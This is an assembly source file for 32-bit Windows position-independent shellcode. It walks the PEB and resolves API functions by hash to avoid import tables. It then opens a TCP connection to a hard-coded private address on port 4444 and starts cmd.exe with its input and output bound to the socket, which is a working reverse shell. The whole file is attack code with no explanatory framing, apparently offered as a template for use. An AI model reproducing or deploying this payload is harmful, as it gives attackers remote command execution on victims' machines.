[BITS 32]

mainentrypoint:

call geteip

geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction?

mov ebp, esp
;sub esp, 1000h
sub esp, 0x900
push edx
mov ebx, 0x4b1ffe8e ; TODO: add your module hash
call get_module_address
pop edx

push ebp
push edx
mov ebp, eax

lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

;TODO call your api.
; Call LoadLibraryA to get ws2_32.dll into memory
push ebp
push edx
lea eax, [EDX + WS32]
push eax
call [EDX + LoadLibraryA]
pop edx
pop ebp

; Build WS32 API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + WS32HASHTABLE]
lea edi, [EDX + WS32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call WSAStartup
; xor ebx, ebx
mov ebx, edx
sub esp, 0x0190 ; (sizeof(wsadata):)
push esp ; pointer for WSAData
push 0x0202 ; version 2.2
call [EDX + WSAStartup]
mov edx, ebx


; Create WSASocketA
mov edi, edx
xor ebx, ebx
push ebx ; null
push ebx ; null
push ebx ; null
push 0x06 ; TCP 
push 0x01 ; SOCK_STREAM
push 0x02 ; ipv4
call [EDX + WSASocketA]
mov edx, edi


; Call WSAConnect
push 0x809fa8c0; ip 192.168.159.128
push word 0x5c11 ; port 4444 
push word 0x02 ; ipv4
mov ebx, esp ; save sockaddr struct pointer
push 0x0
push 0x0
push 0x0
push 0x0
push 0x10 ; push size of sockaddr
push ebx ; push sockaddr
push eax ; push socket descriptor
mov edi, eax
mov esi, edx
call [EDX + WSAConnect]
mov edx, esi
;;

; Call CreateProcessA
; can do some loops in here to make it cleaner and smaller
mov ebx, edx
push 0x0
push 0x0
push 0x0
push 0x0 ; process info struct
mov ecx, esp; save process info for later
push edi ; stderror
push edi ; stdoutput
push edi ; stdintput
push 0x0
push 0x0
push 0x0101 ; STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x44 ; startupinfo.cb
mov eax, esp
push ecx ; push processinfo
push eax ; push startupinfo
push 0x0 ; curent dir
push 0x0 ; environment
push 0x0 ; creation flags
push 0x1 ; inherithandles
push 0x0 ; threatattributes
push 0x0 ; process attributes
lea esi, [EDX+ CMD] ; cmd.exe
push esi
push 0x0 ; app name:
call [EDX + CreateProcessA]
mov edx, ebx


; Call Exit Process
push 0x00 ; Error code
call [EDX + ExitProcess]

; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]
;xor ecx, ecx

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0x46318ac7 ; CreateProcessA
	dd 0x95902b19 ; ExitProcess
	dd 0xc8ac8026 ; LoadLibraryA
	dd 0xFFFF ; make sure to end with this token

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
	dd 0x00000000

ExitProcess:
	dd 0x00000001

LoadLibraryA:
	dd 0x00000002


CMD:
	db "cmd.exe",0



WS32:
	db "ws2_32.dll", 0


WS32HASHTABLE:
	dd 0x3e5a7ea1 ; WSAConnect
	dd 0xeefa3514 ; WSASocketA
	dd 0xcdde757d ; WSAStartup
	dd 0xFFFF


WS32FUNCTIONSTABLE:
WSAConnect:
	dd 0x00000003
WSASocketA:
	dd 0x00000004
WSAStartup:
	dd 0x00000005

